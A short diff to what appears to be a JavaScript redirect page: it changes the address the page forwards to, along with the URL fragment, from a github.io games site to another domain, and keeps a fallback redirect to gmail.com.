@@ -97,7 +97,7 @@ try {
   if (params.unencrypted) {
     window.location.href = params.url;
   } else {
-    window.location.href = "https://gamesdrive.github.io/SR/" + window.location.hash;
+    window.location.href = "https://s.cybar.xyz/" + window.location.hash;
   }
 } catch {
   window.location.replace("https://gmail.com");
